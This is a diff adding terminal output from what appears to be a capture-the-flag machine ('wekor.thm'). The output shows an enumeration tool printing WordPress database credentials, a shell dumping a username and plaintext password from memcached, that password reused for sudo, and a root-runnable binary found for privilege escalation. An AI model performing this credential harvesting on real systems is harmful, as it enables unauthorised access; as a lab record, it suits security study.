@@ -242,3 +242,52 @@ Stopped: Mon May 20 04:33:25 2024
 
 
  ### soccer13
+
+╔══════════╣ Analyzing Wordpress Files (limit 70)
+-rw-rw-rw- 1 www-data www-data 3192 Jan 21  2021 /var/www/html/site.wekor.thm/wordpress/wp-config.php               
+define( 'DB_NAME', 'wordpress' );
+define( 'DB_USER', 'root' );
+define( 'DB_PASSWORD', 'root123@#59' );
+define( 'DB_HOST', 'localhost' );
+
+www-data@osboxes:/tmp$ telnet localhost 11211
+telnet localhost 11211
+Trying 127.0.0.1...
+Connected to localhost.
+Escape character is '^]'.
+version
+version
+VERSION 1.4.25 Ubuntu
+id
+id
+ERROR
+get username 
+get username
+VALUE username 0 4
+Orka
+END
+value password
+value password
+ERROR
+get password
+get password
+VALUE password 0 15
+## OrkAiSC00L24/7$
+
+
+Orka@osboxes:~$ sudo -l
+sudo -l
+[sudo] password for Orka: 1a26a6d51c0172400add0e297608dec6
+
+Sorry, try again.
+[sudo] password for Orka: OrkAiSC00L24/7$
+
+Matching Defaults entries for Orka on osboxes:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User Orka may run the following commands on osboxes:
+    (root) /home/Orka/Desktop/bitcoin
+Orka@osboxes:~$ 
+
+
